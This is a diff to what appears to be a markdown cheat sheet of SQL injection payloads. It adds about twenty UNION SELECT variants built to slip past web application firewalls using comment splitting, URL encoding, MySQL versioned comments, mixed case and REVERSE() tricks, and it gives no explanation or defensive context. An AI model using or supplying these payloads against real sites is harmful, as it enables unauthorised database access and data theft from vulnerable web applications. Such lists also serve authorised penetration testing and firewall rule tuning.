@@ -162,13 +162,30 @@ ORDER BY 1,2,3,4,5,6,7,8,9
 ```
 >next union
 ```
-union selcet 
++un/**/ion+se/**/lect
+union selcet
+AND 0 ?NION SELECT
+AND 0 %55NION %53ELET
+AND 0 UNION SELECT null,null,null
 AND+0+/*!50000%55NI\ON*/+/*!
 50000%53ELE\CT/**_**/*/
-
+%75nion %73elect
 %23%0A/*!50000union/**_**/*/
 %23%0AdistinctROW/**_**/
 %23%0ASelect%23%0A
+AND 0 UNION(SELECT(1),(2),(3),(4),(5),(6),(7),(8),(9))
++un/**/ion+se/**/lect
++UNION+ALL+SELECT
++AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/
+/*!50000UNION/**_**/*/
++And .0UnIOn-- -%0ASeLe%43t
+/*!%2f**%2funion%2f**%2fselect%2f**%2f
+/*!12345#qa%0A#%0AUnIOn*/(/*!12345#qa%0A#%0ASeleCt*//**/1)
++AND+0+UNION/**/DISTINCTROW+SELECT
++AND+MOD(52,12)+/*!50000UNION/**_**/*/+/*!50000SELECT/**_**/*/
+/**8**/and/**8**/0/**8**/UniOn/**8**/sEleCT/**8**/
++And/**/.0union/*%26*/distinctROW+select
++REVERSE(noinu)+REVERSE(tceles)
 ```
 
 
